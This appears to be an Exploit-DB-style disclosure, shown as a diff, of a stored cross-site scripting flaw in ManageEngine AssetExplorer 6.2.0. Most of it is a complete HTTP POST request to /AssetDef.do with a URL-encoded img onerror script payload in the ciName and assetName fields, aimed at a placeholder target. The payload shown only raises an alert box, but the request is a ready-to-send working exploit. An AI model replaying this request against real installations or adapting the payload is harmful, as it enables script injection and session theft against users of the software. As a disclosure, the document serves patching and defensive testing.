@@ -1,0 +1,30 @@
+# Exploit Title: ManageEngine AssetExplorer 6.2.0 - Cross-Site Scripting 
+# Date: 2018-09-26
+# Exploit Author: Ismail Tasdelen
+# Vendor Homepage: https://www.manageengine.com/
+# Hardware Link : https://www.manageengine.com/products/asset-explorer/
+# Software : ZOHO Corp ManageEngine AssetExplorer 6.2.0
+# Product Version: 6.2.0
+# Vulernability Type : Cross-Site Scripting
+# Vulenrability : Stored XSS
+# CVE : N/A
+
+#In Zoho ManageEngine AssetExplorer, a Stored XSS vulnerability was discovered in the 6.2.0 
+# version via the /AssetDef.do ciName or assetName parameter. 
+ 
+# HTTP Request Header :
+
+POST /AssetDef.do HTTP/1.1
+Host: TARGET
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://TARGET/AssetDef.do
+Cookie: JSESSIONID=70D4D1E08E51E5401B3E8FE1D17CAE9D; JSESSIONIDSSO=01AE09FF54B9B733107CD17E6D4079D7; sdp=8cb6d209-54e0-41cc-8bb2-1d462c6d3b72; nonitassetslinks=hide; Components=hide; virtual=hide; viewlinks=hide; Softwarediv=hide; barcodeDiv=hide; itassetslinks=show; %5Bobject%20HTMLTableRowElement%5D=hide; %5Bobject%20HTMLTableElement%5D=hide
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 705
+
+typeId=9&ciTypeId=21&ciId=null&ciName=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%22ismailtasdelen%22%29%3E&assetName=%22%3E%3Cimg+src%3Dx+onerror%3Dalert%28%22ismailtasdelen%22%29%3E&componentID=301&CI_BaseElement_ATTRIBUTE_302=&CI_BaseElement_IMPACTID=null&ciDescription=&activeStateId=2&isStateChange=&resourceState=1&assignedType=Assign&asset=0&user=0&department=0&leaseStart=&leaseEnd=&site=-1&location=&vendorID=0&assetPrice=0&assetTag=&acqDate=&assetSerialNo=&expDate=&assetBarCode=&warrantyExpDate=&udfName3=&depreciationTypeId=&declinePercent=&usefulLife=&depreciationPercent=&salvageValue=&isProductInfoChanged=&assetID=&previousSite=&addAsset=Save&purchasecost=&modifycost=true&oldAssociatedVendor=
